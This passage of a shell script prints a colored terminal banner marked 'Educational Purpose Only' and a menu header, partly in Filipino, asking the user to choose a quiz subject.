echo  "  ${BGreen}Status       : ${PWhite}Educational Purpose Only${NC}"
echo  "${PWhite}  ==========================================${NC}"

# --- QUIZ SELECTION ---
echo  "\n  ${BCyan}${Bold}[ PILI NG QUIZ SUBJECT ]${NC}"
